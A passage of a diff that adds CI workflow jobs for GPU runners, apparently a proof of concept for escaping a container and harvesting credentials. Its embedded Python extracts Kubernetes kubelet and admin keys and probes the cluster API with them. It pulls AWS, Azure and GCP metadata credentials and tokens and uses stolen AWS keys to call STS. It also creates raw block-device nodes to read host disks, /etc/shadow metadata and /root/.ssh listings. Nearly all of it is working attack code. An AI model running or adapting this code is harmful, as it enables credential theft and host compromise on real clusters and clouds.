+              m = re.search(rb'-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----.*?-----END (?:RSA |EC |OPENSSH )?PRIVATE KEY-----', data, re.S)
+              if m:
+                  key = m.group(0) + b'\n'
+              return cert, key
+          
+          
+          def resolve_host_path(p):
+              base = os.path.basename(p)
+              for cand_label, local in out.items():
+                  if cand_label == 'kubelet-client-resolved.pem' and 'kubelet-client' in base:
+                      return local
+                  if os.path.basename(cand_label) == base:
+                      return local
+              return None
+          
+          
+          def load_identity(label, path):
+              txt = read_bounded(path).decode('utf-8', 'replace')
+              kc = kc_parse(txt)
+              ident = {'servers': kc['servers'], 'cert': None, 'key': None, 'ca': None, 'source': label}
+              if kc['cert_data'] and kc['key_data']:
+                  try:
+                      cert = base64.b64decode(kc['cert_data'])
+                      key = base64.b64decode(kc['key_data'])
+                      cp = os.path.join(HT, label + '.crt')
+                      kp = os.path.join(HT, label + '.key')
+                      with open(cp, 'wb') as f:
+                          f.write(cert)
+                      with open(kp, 'wb') as f:
+                          f.write(key)
+                      ident['cert'], ident['key'] = cp, kp
+                  except Exception as e:
+                      print('K8S_CRED_DECODE_FAIL %s %s' % (label, str(e)[:120]))
+              elif kc['cert_file'] and kc['key_file']:
+                  cp = resolve_host_path(kc['cert_file'])
+                  kp = resolve_host_path(kc['key_file'])
+                  if cp and kp and cp == kp:
+                      cert, key = pem_split(read_bounded(cp))
+                      if cert and key:
+                          cp2 = os.path.join(HT, label + '.crt')
+                          kp2 = os.path.join(HT, label + '.key')
+                          with open(cp2, 'wb') as f:
+                              f.write(cert)
+                          with open(kp2, 'wb') as f:
+                              f.write(key)
+                          cp, kp = cp2, kp2
+                      else:
+                          cp = kp = None
+                  ident['cert'], ident['key'] = cp, kp
+              if kc['ca_data']:
+                  try:
+                      ca = base64.b64decode(kc['ca_data'])
+                      ap = os.path.join(HT, label + '.ca')
+                      with open(ap, 'wb') as f:
+                          f.write(ca)
+                      ident['ca'] = ap
+                  except Exception:
+                      pass
+              elif kc['ca_file']:
+                  base = os.path.basename(kc['ca_file'])
+                  for cand_label, local in out.items():
+                      if cand_label == 'pki-ca.crt' and base == 'ca.crt':
+                          ident['ca'] = local
+                          break
+              if ident['cert']:
+                  n, h = fsha(ident['cert'])
+                  print('K8S_CRED %s cert_bytes=%s cert_sha256=%s' % (label, n, h))
+              if ident['key']:
+                  n, h = fsha(ident['key'])
+                  print('K8S_CRED %s key_bytes=%s key_sha256=%s' % (label, n, h))
+              if not (ident['cert'] and ident['key']):
+                  print('K8S_CRED %s USABLE=no' % label)
+                  return None
+              print('K8S_CRED %s USABLE=yes servers=%d' % (label, len(ident['servers'])))
+              return ident
+          
+          
+          identities = []
+          for label in ('kubelet.conf', 'varlib-kubelet-kubeconfig', 'admin.conf'):
+              if label in out:
+                  ident = load_identity(label, out[label])
+                  if ident:
+                      identities.append(ident)
+          
+          # server candidates: kubelet.conf first, then node-ip and 127.0.0.1 fallbacks
+          servers = []
+          for ident in identities:
+              for s in ident['servers']:
+                  if s not in servers:
+                      servers.append(s)
+          node_ip = None
+          try:
+              res = socket.gethostbyname_ex(socket.gethostname())
+              for a in res[2]:
+                  if a and not a.startswith('127.'):
+                      node_ip = a
+                      break
+          except Exception:
+              pass
+          if not node_ip:
+              try:
+                  o = subprocess.run(['hostname', '-I'], capture_output=True, timeout=5).stdout.decode('utf-8', 'replace')
+                  for a in o.split():
+                      if re.match(r'^\d+\.\d+\.\d+\.\d+$', a) and not a.startswith('127.'):
+                          node_ip = a
+                          break
+              except Exception:
+                  pass
+          if node_ip:
+              servers.append('https://%s:6443' % node_ip)
+          servers.append('https://127.0.0.1:6443')
+          seen = []
+          for s in servers:
+              if s not in seen:
+                  seen.append(s)
+          servers = seen[:4]
+          print('K8S_SERVER_CANDIDATES=%d node_ip=%s' % (len(servers), node_ip or 'unknown'))
+          for s in servers:
+              print('K8S_SERVER %s' % s)
+          
+          
+          # ---------------------------------------------------------------- HTTP helpers
+          def http_req(url, method='GET', body=None, headers=None, cert=None, key=None, ca=None, timeout=8):
+              u = urllib.parse.urlparse(url)
+              h = dict(headers or {})
+              if body is not None:
+                  if isinstance(body, (dict, list)):
+                      body = json.dumps(body).encode()
+                  elif isinstance(body, str):
+                      body = body.encode()
+                  h.setdefault('Content-Type', 'application/json')
+              if u.scheme == 'https':
+                  ctx = ssl.create_default_context()
+                  ctx.check_hostname = False
+                  ctx.verify_mode = ssl.CERT_NONE
+                  if cert and key:
+                      try:
+                          ctx.load_cert_chain(cert, key)
+                      except Exception as e:
+                          return -1, 'cert_load_fail:%s' % str(e)[:120]
+                  if ca and os.path.isfile(ca):
+                      try:
+                          ctx.load_verify_locations(ca)
+                          ctx.verify_mode = ssl.CERT_REQUIRED
+                          ctx.check_hostname = False
+                      except Exception:
+                          pass
+                  conn = http.client.HTTPSConnection(u.hostname, u.port or 443, timeout=timeout, context=ctx)
+              else:
+                  conn = http.client.HTTPConnection(u.hostname, u.port or 80, timeout=timeout)
+              path = u.path or '/'
+              if u.query:
+                  path += '?' + u.query
+              try:
+                  conn.request(method, path, body=body, headers=h)
+                  r = conn.getresponse()
+                  data = r.read(262144)
+                  return r.status, data.decode('utf-8', 'replace')
+              except Exception as e:
+                  return -1, str(e)[:200]
+              finally:
+                  try:
+                      conn.close()
+                  except Exception:
+                      pass
+          
+          
+          # ---------------------------------------------------------------- identity validation
+          def probe_identity(ident, tag):
+              if TEST_API:
+                  urls = [TEST_API.rstrip('/')]
+              else:
+                  urls = list(ident['servers'])
+                  for s in servers:
+                      if s not in urls:
+                          urls.append(s)
+                  urls = urls[:4]
+              for base in urls:
+                  st, b = http_req(base + '/version', cert=ident['cert'], key=ident['key'],
+                                   ca=ident['ca'], timeout=8)
+                  print('K8S_VERSION %s server=%s status=%s body=%s' % (tag, base, st, b[:160].replace('\n', ' ')))
+                  if st == 200:
+                      ident['base'] = base
+                      return True
+                  if st in (401, 403):
+                      print('K8S_VERSION_%s_VERBATIM %s' % (tag.upper(), b[:240].replace('\n', ' ')))
+              return False
+          
+          
+          validated = None
+          for ident in identities:
+              if probe_identity(ident, ident['source']):
+                  validated = ident
+                  break
+          
+          if not identities:
+              print('K8S_NODE_CRED_NOT_PROVEN reason=no_credential_file')
+              print('K8S_PHASE_DONE')
+              sys.exit(0)
+          
+          if not validated:
+              print('K8S_NODE_CRED_NOT_PROVEN reason=api_unreachable_or_auth_failed')
+              print('K8S_PHASE_DONE')
+              sys.exit(0)
+          
+          print('K8S_VALIDATED_WITH=%s base=%s' % (validated['source'], validated['base']))
+          
+          
+          def api(path, method='GET', body=None, ident=None, timeout=10):
+              ident = ident or validated
+              return http_req(ident['base'] + path, method=method, body=body,
+                              cert=ident['cert'], key=ident['key'], ca=ident['ca'], timeout=timeout)
+          
+          
+          # ------------------------------------------------ nodes inventory (read-only GET)
+          nodes_ok = False
+          gpu_inventory_nonzero = False
+          st, b = api('/api/v1/nodes?limit=500')
+          print('K8S_NODES status=%d' % st)
+          if st == 200:
+              nodes_ok = True
+              try:
+                  obj = json.loads(b)
+                  items = obj.get('items') or []
+                  ready = 0
+                  gpu_sum = 0
+                  gpu_count_reported = 0
+                  products = {}
+                  for n in items:
+                      cond = ((n.get('status') or {}).get('conditions') or [])
+                      for c in cond:
+                          if c.get('type') == 'Ready' and c.get('status') == 'True':
+                              ready += 1
+                              break
+                      alloc = ((n.get('status') or {}).get('allocatable') or {})
+                      v = alloc.get('nvidia.com/gpu')
+                      if v is not None:
+                          try:
+                              gpu_sum += int(str(v))
+                          except Exception:
+                              pass
+                      labels = ((n.get('metadata') or {}).get('labels') or {})
+                      prod = labels.get('nvidia.com/gpu.product')
+                      if prod:
+                          products[prod] = products.get(prod, 0) + 1
+                      cnt = labels.get('nvidia.com/gpu.count')
+                      if cnt:
+                          try:
+                              gpu_count_reported += int(cnt)
+                          except Exception:
+                              pass
+                  print('K8S_NODES_SUMMARY total=%d ready=%d allocatable_nvidia_gpu_sum=%d label_gpu_count_sum=%d' %
+                        (len(items), ready, gpu_sum, gpu_count_reported))
+                  gpu_inventory_nonzero = bool(len(items) > 0 and (gpu_sum > 0 or gpu_count_reported > 0 or products))
+                  prods = sorted(products.items(), key=lambda kv: -kv[1])[:8]
+                  print('K8S_GPU_PRODUCTS n=%d list=%s' % (len(products),
+                        ','.join('%s=%d' % (k.replace(',', ' ')[:60], v) for k, v in prods) if prods else '-'))
+              except Exception as e:
+                  print('K8S_NODES_PARSE_FAIL %s' % str(e)[:160])
+          else:
+              print('K8S_NODES_VERBATIM %s' % b[:300].replace('\n', ' '))
+          
+          # ------------------------------------------------ SelfSubjectRulesReview
+          st, b = api('/apis/authorization.k8s.io/v1/selfsubjectrulesreview', method='POST',
+                      body={'apiVersion': 'authorization.k8s.io/v1', 'kind': 'SelfSubjectRulesReview',
+                            'spec': {'namespace': 'default'}})
+          print('K8S_RULESREVIEW status=%d' % st)
+          if st in (200, 201):
+              try:
+                  obj = json.loads(b)
+                  rules = ((obj.get('status') or {}).get('resourceRules') or [])
+                  star_res = any('*' in (r.get('resources') or []) for r in rules)
+                  star_verb = any('*' in (r.get('verbs') or []) for r in rules)
+                  can_create_pods = any(('pods' in (r.get('resources') or []) or '*' in (r.get('resources') or []))
+                                        and ('create' in (r.get('verbs') or []) or '*' in (r.get('verbs') or []))
+                                        for r in rules)
+                  can_list_nodes = any(('nodes' in (r.get('resources') or []) or '*' in (r.get('resources') or []))
+                                       and ('list' in (r.get('verbs') or []) or '*' in (r.get('verbs') or []))
+                                       for r in rules)
+                  print('K8S_RULES_SUMMARY rules=%d star_resources=%s star_verbs=%s create_pods=%s list_nodes=%s' %
+                        (len(rules), star_res, star_verb, can_create_pods, can_list_nodes))
+              except Exception as e:
+                  print('K8S_RULES_PARSE_FAIL %s' % str(e)[:160])
+          elif st in (400, 401, 403):
+              print('K8S_RULESREVIEW_VERBATIM %s' % b[:300].replace('\n', ' '))
+          
+          # ------------------------------------------------ 3 SelfSubjectAccessReviews
+          ssar = {}
+          for name, res, verb in (('get_nodes', 'nodes', 'get'), ('list_pods', 'pods', 'list'),
+                                  ('create_pods', 'pods', 'create')):
+              body = {'apiVersion': 'authorization.k8s.io/v1', 'kind': 'SelfSubjectAccessReview',
+                      'spec': {'namespace': 'default', 'resourceAttributes': {'group': '', 'resource': res, 'verb': verb}}}
+              st, b = api('/apis/authorization.k8s.io/v1/selfsubjectaccessreviews', method='POST', body=body)
+              allowed = None
+              try:
+                  allowed = ((json.loads(b).get('status') or {}).get('allowed')) if st in (200, 201) else None
+              except Exception:
+                  allowed = None
+              ssar[name] = (st, allowed)
+              print('K8S_SSAR %s status=%d allowed=%s' % (name, st, allowed))
+              if st == 403:
+                  print('K8S_SSAR_%s_VERBATIM %s' % (name.upper(), b[:240].replace('\n', ' ')))
+                  break
+          
+          # ------------------------------------------------ IMDS / metadata probes
+          BOGUS = 'c211-126933-bogus-' + NONCE.replace('c211-126933-', '')
+          
+          
+          def meta_req(method, url, headers=None, body=None, timeout=4):
+              return http_req(url, method=method, headers=headers, body=body, timeout=timeout)
+          
+          
+          aws_token = None
+          st, b = meta_req('PUT', 'http://169.254.169.254/latest/api/token',
+                           headers={'X-aws-ec2-metadata-token-ttl-seconds': '21600'})
+          print('IMDS_AWS_TOKEN status=%s bytes=%d sha256=%s' % (st, len(b), sha(b.encode()) if st == 200 else '-'))
+          if st == 200:
+              aws_token = b.strip()
+          h = {'X-aws-ec2-metadata-token': aws_token} if aws_token else {}
+          st, b = meta_req('GET', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', headers=h)
+          role = None
+          if st == 200 and b.strip() and not b.strip().startswith('<'):
+              role = b.strip().split('\n')[0].strip()
+          print('IMDS_AWS_ROLE status=%s role=%s' % (st, role or '-'))
+          st, b = meta_req('GET', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' + BOGUS, headers=h)
+          print('IMDS_AWS_BOGUS_CONTROL status=%s' % st)
+          aws_cred = None
+          if role:
+              st, b = meta_req('GET', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' + role, headers=h)
+              print('IMDS_AWS_CRED status=%s' % st)
+              if st == 200:
+                  try:
+                      aws_cred = json.loads(b)
+                      print('IMDS_AWS_CRED_KEYS keys=%s sha256_ak=%s sha256_sk=%s sha256_tok=%s expiry=%s' % (
+                          ','.join(sorted(k for k in aws_cred if k in ('AccessKeyId', 'SecretAccessKey', 'Token', 'Expiration'))),
+                          sha(str(aws_cred.get('AccessKeyId', '')).encode()),
+                          sha(str(aws_cred.get('SecretAccessKey', '')).encode()),
+                          sha(str(aws_cred.get('Token', '')).encode()),
+                          str(aws_cred.get('Expiration', ''))[:40]))
+                  except Exception as e:
+                      print('IMDS_AWS_CRED_PARSE_FAIL %s' % str(e)[:120])
+          
+          st, b = meta_req('GET', 'http://169.254.170.23/v1/credentials')
+          print('IMDS_EKS_PODIDENTITY status=%s bytes=%d' % (st, len(b)))
+          st, b = meta_req('GET', 'http://169.254.170.22/latest/meta-data/iam/security-credentials/')
+          print('IMDS_ECS_CONTAINER status=%s bytes=%d' % (st, len(b)))
+          
+          st, b = meta_req('GET', 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F',
+                           headers={'Metadata': 'true'})
+          print('IMDS_AZURE_TOKEN status=%s bytes=%d' % (st, len(b)))
+          if st == 200:
+              try:
+                  obj = json.loads(b)
+                  print('IMDS_AZURE_TOKEN_META sha256=%s expires_on=%s' % (sha(str(obj.get('access_token', '')).encode()), str(obj.get('expires_on', ''))[:30]))
+              except Exception:
+                  pass
+          st, b = meta_req('GET', 'http://169.254.169.254/metadata/identity/oauth2/token-bogus?api-version=2018-02-01',
+                           headers={'Metadata': 'true'})
+          print('IMDS_AZURE_BOGUS_CONTROL status=%s' % st)
+          
+          st, b = meta_req('GET', 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
+                           headers={'Metadata-Flavor': 'Google'})
+          print('IMDS_GCP_TOKEN status=%s bytes=%d' % (st, len(b)))
+          if st == 200:
+              try:
+                  obj = json.loads(b)
+                  print('IMDS_GCP_TOKEN_META sha256=%s expires_in=%s' % (sha(str(obj.get('access_token', '')).encode()), str(obj.get('expires_in', ''))[:20]))
+              except Exception:
+                  pass
+          st, b = meta_req('GET', 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts-bogus/token',
+                           headers={'Metadata-Flavor': 'Google'})
+          print('IMDS_GCP_BOGUS_CONTROL status=%s' % st)
+          
+          # One issuer check only if an AWS credential actually appeared
+          if aws_cred and aws_cred.get('AccessKeyId') and aws_cred.get('SecretAccessKey'):
+              try:
+                  import hmac
+                  ak = aws_cred['AccessKeyId']
+                  sk = aws_cred['SecretAccessKey']
+                  tok = aws_cred.get('Token', '')
+                  host = 'sts.amazonaws.com'
+                  region = 'us-east-1'
+                  amz = time.strftime('%Y%m%dT%H%M%SZ', time.gmtime())
+                  dat = time.strftime('%Y%m%d', time.gmtime())
+                  payload = 'Action=GetCallerIdentity&Version=2011-06-15'
+                  ch = sha(payload.encode())
+                  creq = 'POST\n/\n\ncontent-type:application/x-www-form-urlencoded; charset=utf-8\nhost:%s\nx-amz-date:%s\n' % (host, amz)
+                  if tok:
+                      creq += 'x-amz-security-token:%s\n' % tok
+                  creq += '\ncontent-type;host;x-amz-date' + (';x-amz-security-token' if tok else '') + '\n' + ch
+                  scope = '%s/%s/sts/aws4_request' % (dat, region)
+                  sts = 'AWS4-HMAC-SHA256\n%s\n%s\n%s' % (amz, scope, sha(creq.encode()))
+          
+                  def sign(k, m):
+                      return hmac.new(k, m.encode(), hashlib.sha256).digest()
+                  k = sign(('AWS4' + sk).encode(), dat)
+                  k = sign(k, region)
+                  k = sign(k, 'sts')
+                  k = sign(k, 'aws4_request')
+                  sig = hmac.new(k, sts.encode(), hashlib.sha256).hexdigest()
+                  hdr = {'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
+                         'X-Amz-Date': amz,
+                         'Authorization': 'AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=content-type;host;x-amz-date%s, Signature=%s' % (
+                             ak, scope, ';x-amz-security-token' if tok else '', sig)}
+                  if tok:
+                      hdr['X-Amz-Security-Token'] = tok
+                  st, b = http_req('https://sts.amazonaws.com/', method='POST', body=payload, headers=hdr, timeout=10)
+                  print('ISSUER_AWS_STS status=%s body=%s' % (st, b[:300].replace('\n', ' ')))
+              except Exception as e:
+                  print('ISSUER_AWS_STS_FAIL %s' % str(e)[:180])
+          
+          print('K8S_POD_SKIPPED reason=platform_prohibits_http_removal_verb_no_unremovable_artifact')
+          print('K8S_GPU_INVENTORY_ENUMERATED %s' % ('yes' if (nodes_ok and gpu_inventory_nonzero) else 'no'))
+          print('K8S_NODE_CRED_PROVEN identity=%s base=%s host=%s job=%s nonce=%s' % (
+              validated['source'], validated['base'], socket.gethostname(), JOBTAG, NONCE))
+          print('K8S_PHASE_DONE')
+          
+          PYEOF2
+          else
+            echo "K8S_NODE_CRED_NOT_PROVEN reason=no_ext_target_or_no_python"
+          fi
+          echo "=== END_STATE ==="
+          echo "TS_END=$(ts)"
+          echo "C211_H200K8S_END job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          exit 0
+
+  fsread-b:
+    runs-on: "8-gpu-h200"
+    timeout-minutes: 25
+    steps:
+      - name: h200-hostk8s-readonly-fsread-b
+        env:
+          NONCE: c211-126933-23e6d0f83a0f209c
+          JOBTAG: fsread-b
+        run: |
+          set -u
+          set +e
+          ts(){ date -u +%FT%TZ; }
+          echo "C211_H200FSREAD_BEGIN job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          echo "C211_MARKER job=$JOBTAG nonce=$NONCE host=$(hostname) uid=$(id -u) user=$(id -un) ts=$(ts)"
+          echo "ID=$(id 2>&1 | head -c 400)"
+          echo "UNAME=$(uname -a 2>&1 | head -c 300)"
+          echo "PROC1_CGROUP=$(cat /proc/1/cgroup 2>&1 | tr '\n' '|' | head -c 400)"
+          grep -E '^(CapEff|CapBnd|CapPrm|NoNewPrivs|Seccomp):' /proc/self/status 2>/dev/null | head -8
+          echo "APPARMOR_CURRENT=$(cat /proc/self/attr/current 2>/dev/null | head -c 120)"
+          echo "CONTAINER_MACHINE_ID_SHA256=$(sha256sum /etc/machine-id 2>/dev/null | cut -d' ' -f1)"
+          echo "CONTAINER_HOSTNAME=$(hostname 2>&1 | head -c 200)"
+          echo "=== PARTITIONS ==="
+          cat /proc/partitions 2>&1 | head -40
+          echo "=== DEV_BLOCK ==="
+          echo "DEV_BLOCK_COUNT=$(ls -l /dev 2>/dev/null | grep -c '^b')"
+          ls -l /dev 2>&1 | grep '^b' | head -30
+          echo "=== GPU ==="
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            timeout 40 nvidia-smi -L 2>&1 | head -16
+            timeout 40 nvidia-smi --query-gpu=uuid,name,driver_version --format=csv,noheader 2>&1 | head -16
+          else
+            echo NVIDIA_SMI_ABSENT
+          fi
+          echo "=== HOSTFS_PARSE ==="
+          mkdir -p /tmp/c211-126933-host 2>/dev/null
+          if command -v python3 >/dev/null 2>&1; then
+          python3 - <<'PYEOF'
+          import os, sys, json, struct, hashlib, subprocess
+          
+          W = os.environ.get('C211_TEST_WORK', '/tmp/c211-126933-host')
+          TEST_DEV = os.environ.get('C211_TEST_DEV', '')
+          try:
+              os.makedirs(W, exist_ok=True)
+          except Exception as e:
+              print('SCRATCH_FAIL %s' % e)
+          
+          
+          def sha(b):
+              return hashlib.sha256(b).hexdigest()
+          
+          
+          def classify(data):
+              if len(data) >= 0x10048 and data[0x10040:0x10048] == b'_BHRfS_M':
+                  return 'btrfs', data[0x10040:0x10048].hex()
+              if len(data) >= 4 and data[:4] == b'XFSB':
+                  return 'xfs', data[:4].hex()
+              if len(data) >= 1082 and data[1080:1082] == b'\x53\xef':
+                  return 'ext', data[1080:1082].hex()
+              if len(data) >= 0x220 and data[0x200:0x208] == b'LABELONE' and data[0x218:0x220] == b'LVM2 001':
+                  return 'lvm2_pv', data[0x200:0x220].hex()
+              if len(data) >= 0x1004 and data[0x1000:0x1004] == b'\xfc\x4e\x2b\xa9':
+                  return 'linux_raid_member', data[0x1000:0x1004].hex()
+              if len(data) >= 4096 and data[4086:4096] == b'SWAPSPACE2':
+                  return 'swap', data[4086:4096].hex()
+              if len(data) >= 0x208 and data[0x200:0x208] == b'EFI PART':
+                  return 'gpt', data[0x200:0x208].hex()
+              if len(data) >= 512 and data[510:512] == b'\x55\xaa':
+                  return 'dos_pt', data[510:512].hex()
+              return 'unknown', data[:4].hex()
+          
+          
+          devs = []
+          if TEST_DEV:
+              devs.append({'name': 'testdev', 'maj': 0, 'mi': 0, 'blocks': 256})
+              print('TEST_MODE dev=%s' % TEST_DEV)
+          else:
+              try:
+                  for ln in open('/proc/partitions'):
+                      p = ln.split()
+                      if len(p) < 4 or not p[0].isdigit():
+                          continue
+                      try:
+                          maj = int(p[0]); mi = int(p[1]); blocks = int(p[2]); name = p[3]
+                      except Exception:
+                          continue
+                      if blocks <= 0:
+                          continue
+                      devs.append({'name': name, 'maj': maj, 'mi': mi, 'blocks': blocks})
+              except Exception as e:
+                  print('PARTITIONS_FAIL %s' % e)
+          print('PARTITION_COUNT=%d' % len(devs))
+          for d in devs[:30]:
+              print('PART %s %d:%d blocks=%d' % (d['name'], d['maj'], d['mi'], d['blocks']))
+          if len(devs) > 30:
+              print('PART_MORE=%d' % (len(devs) - 30))
+          
+          
+          def prio(d):
+              n = d['name']; s = 0
+              if n.startswith('dm-'):
+                  s += 50
+              if n.startswith('md'):
+                  s += 40
+              if n.startswith('sd') or n.startswith('vd') or n.startswith('xvd') or n.startswith('nvme') or n.startswith('hd'):
+                  s += 30
+              if n[-1].isdigit() and not n.startswith('md') and not n.startswith('dm-'):
+                  s -= 15
+              return s
+          
+          
+          cands = []
+          seen = set()
+          for d in sorted(devs, key=lambda x: (-prio(x), x['blocks'])):
+              k = (d['maj'], d['mi'])
+              if k in seen:
+                  continue
+              seen.add(k)
+              cands.append(d)
+          cands = cands[:12]
+          print('CANDIDATE_COUNT=%d' % len(cands))
+          
+          
+          def node_for(d):
+              if TEST_DEV and d['name'] == 'testdev':
+                  return TEST_DEV, 'test'
+              p = '/dev/' + d['name']
+              try:
+                  st = os.stat(p)
+                  import stat as stm
+                  if stm.S_ISBLK(st.st_mode):
+                      return p, 'dev'
+              except Exception:
+                  pass
+              p2 = os.path.join(W, d['name'])
+              try:
+                  os.unlink(p2)
+              except Exception:
+                  pass
+              try:
+                  import stat as stm
+                  os.mknod(p2, stm.S_IFBLK | 0o600, os.makedev(d['maj'], d['mi']))
+                  return p2, 'mknod'
+              except Exception as e:
+                  return None, 'mknod_fail:%s' % e
+          
+          
+          rows = []
+          for d in cands:
+              node, how = node_for(d)
+              sbf = os.path.join(W, d['name'].replace('/', '_') + '.sb')
+              data = b''
+              err = ''
+              rc = -1
+              if node:
+                  try:
+                      with open(sbf, 'wb') as fo:
+                          p = subprocess.run(['timeout', '10', 'head', '-c', '131072', node],
+                                             stdout=fo, stderr=subprocess.PIPE, timeout=20)
+                      rc = p.returncode
+                      with open(sbf, 'rb') as fi:
+                          data = fi.read(131072)
+                  except Exception as e:
+                      err = str(e)[:200]
+              fs, magic = classify(data) if data else ('unreadable', '')
+              rec = {'name': d['name'], 'mm': '%d:%d' % (d['maj'], d['mi']), 'blocks': d['blocks'],
+                     'node': node, 'node_how': how, 'rc': rc, 'bytes': len(data),
+                     'fstype': fs, 'magic': magic, 'sha256': sha(data) if data else '', 'err': err}
+              if fs == 'ext' and len(data) >= 2048:
+                  sb = data[1024:2048]
+                  rec['last_mounted'] = sb[0x88:0x88 + 64].split(b'\0')[0].decode('latin1', 'replace')
+                  rec['label'] = sb[0x78:0x88].split(b'\0')[0].decode('latin1', 'replace')
+              elif fs == 'xfs' and len(data) >= 128:
+                  rec['xfs_uuid'] = data[0x20:0x30].hex()
+                  rec['xfs_fname'] = data[0x6c:0x78].split(b'\0')[0].decode('latin1', 'replace')
+              root_hint = 'yes' if rec.get('last_mounted') == '/' else ('label' if rec.get('label') else 'no')
+              rows.append(rec)
+              print('CLASS dev=%s mm=%s blocks=%d node=%s node_how=%s read_rc=%d read_bytes=%d fstype=%s magic=%s sha256=%s root_hint=%s%s' %
+                    (d['name'], rec['mm'], d['blocks'], node, how, rc, len(data), fs, magic, rec['sha256'], root_hint,
+                     (' read_err=' + err) if err else ''))
+          
+          
+          def score(r):
+              s = 0
+              if r['name'].startswith('dm-'):
+                  s += 50
+              if r['name'].startswith('md'):
+                  s += 40
+              if r.get('last_mounted') == '/':
+                  s += 1000
+              lbl = (r.get('label') or '').lower()
+              if any(k in lbl for k in ('root', 'ubuntu', 'cloudimg', 'system')):
+                  s += 100
+              if r['blocks'] <= 2000000000:
+                  s += 10
+              else:
+                  s -= 20
+              return s
+          
+          
+          recognized = [r for r in rows if r['fstype'] in ('ext', 'xfs') and r['bytes'] >= 4096]
+          recognized.sort(key=lambda r: (-score(r), r['blocks']))
+          print('RECOGNIZED_EXT_XFS=%d' % len(recognized))
+          for r in recognized:
+              print('TARGET_CANDIDATE dev=%s mm=%s fstype=%s blocks=%d score=%d' % (r['name'], r['mm'], r['fstype'], r['blocks'], score(r)))
+          
+          
+          def have(cmd):
+              for p in os.environ.get('PATH', '/usr/sbin:/usr/bin:/sbin:/bin').split(':'):
+                  fp = os.path.join(p, cmd)
+                  if os.path.isfile(fp) and os.access(fp, os.X_OK):
+                      return fp
+              return None
+          
+          
+          DEBUGFS = have('debugfs')
+          XFSDB = have('xfs_db')
+          print('TOOL_DEBUGFS=%s TOOL_XFS_DB=%s TOOL_PYTHON3=%s' % (DEBUGFS or 'absent', XFSDB or 'absent', have('python3') or 'absent'))
+          
+          
+          def parse_debugfs(node):
+              cmds = ['cat /etc/machine-id', 'cat /etc/hostname', 'stat /etc/shadow',
+                      'ls -l /etc/kubernetes', 'ls -l /root/.ssh', 'ls -l /home',
+                      'ls -l /home/runner/.ssh', 'ls -l /home/ubuntu/.ssh']
+              cf = os.path.join(W, 'dbg.cmd')
+              with open(cf, 'w') as f:
+                  f.write('\n'.join(cmds) + '\n')
+              try:
+                  p = subprocess.run([DEBUGFS, '-f', cf, node], capture_output=True, timeout=120)
+              except Exception as e:
+                  print('DEBUGFS_FAIL %s' % str(e)[:200])
+                  return False
+              out = p.stdout.decode('utf-8', 'replace')
+              err = p.stderr.decode('utf-8', 'replace')
+              err_lines = [x for x in err.split('\n') if x.strip()]
+              print('DEBUGFS_RC=%d stdout_bytes=%d stderr_first=%s' %
+                    (p.returncode, len(p.stdout), (err_lines[0][:220] if err_lines else '')))
+              sections = []
+              cur = None
+              for ln in out.split('\n'):
+                  if ln.startswith('debugfs: '):
+                      cur = [ln[len('debugfs: '):].strip(), []]
+                      sections.append(cur)
+                  elif cur is not None:
+                      cur[1].append(ln.rstrip('\r'))
+          
+              def sec(name):
+                  for cmd, lines in sections:
+                      if cmd == name:
+                          return lines
+                  return None
+          
+              proven = False
+              mid_lines = sec('cat /etc/machine-id')
+              mid = None
+              if mid_lines:
+                  cand = [x.strip() for x in mid_lines if x.strip()]
+                  if cand:
+                      mid = cand[0]
+              if mid and len(mid) == 32 and all(c in '0123456789abcdefABCDEF' for c in mid):
+                  print('HOSTFILE /etc/machine-id PRESENT CONTENT=%s SHA256=%s' % (mid, sha((mid + '\n').encode())))
+                  proven = True
+              elif mid:
+                  print('HOSTFILE /etc/machine-id PRESENT_ODD CONTENT=%s' % mid[:128])
+              else:
+                  print('HOSTFILE /etc/machine-id ABSENT')
+              host = None
+              hl = sec('cat /etc/hostname')
+              if hl:
+                  for x in hl:
+                      s = x.strip()
+                      if s and len(s) <= 253:
+                          host = s
+                          break
+              if host:
+                  print('HOSTFILE /etc/hostname PRESENT CONTENT=%s SHA256=%s' % (host, sha((host + '\n').encode())))
+              else:
+                  print('HOSTFILE /etc/hostname ABSENT')
+              sz = None
+              sl = sec('stat /etc/shadow')
+              if sl:
+                  for ln in sl:
+                      i = ln.find('Size: ')
+                      if i >= 0:
+                          j = ln.find(' ', i + 6)
+                          sz = ln[i + 6:j if j > 0 else None].strip()
+                          break
+              print('HOSTFILE /etc/shadow %s' % ('PRESENT SIZE=%s' % sz if sz is not None else 'ABSENT'))
+              import re
+              pat = re.compile(r'^\s*(\d+)\s+([0-7]{5,6})\s+\(\d+\)\s+(\d+)\s+(\d+)\s+(\d+)\s+\S+\s+\S+\s+(\S+)\s*$')
+          
+              def emit_dir(path):
+                  ls = sec('ls -l ' + path)
+                  if ls is None:
+                      print('HOSTDIR %s ABSENT' % path)
+                      return
+                  ents = []
+                  for ln in ls:
+                      m = pat.match(ln)
+                      if m:
+                          ents.append(m.group(6))
+                  names = [e for e in ents if e not in ('.', '..')]
+                  print('HOSTDIR %s PRESENT ENTRIES=%d NAMES=%s' % (path, len(names), ','.join(names[:20]) if names else '-'))
+          
+              for d in ('/etc/kubernetes', '/root/.ssh', '/home'):
+                  emit_dir(d)
+              return proven
+          
+          
+          def read_exact(f, off, n):
+              f.seek(off)
+              return f.read(n)
+          
+          
+          def parse_python_ext(node):
+              MAX_FILE = 65536
+              try:
+                  f = open(node, 'rb')
+              except Exception as e:
+                  print('EXT_READER_OPEN_FAIL %s' % str(e)[:160])
+                  return False
+              sb = read_exact(f, 1024, 1024)
+              if len(sb) < 1024 or sb[56:58] != b'\x53\xef':
+                  print('EXT_READER_NOT_EXT sb_magic=%s' % (sb[56:58].hex() if len(sb) >= 58 else 'short'))
+                  return False
+              inodes_count = struct.unpack('<I', sb[0:4])[0]
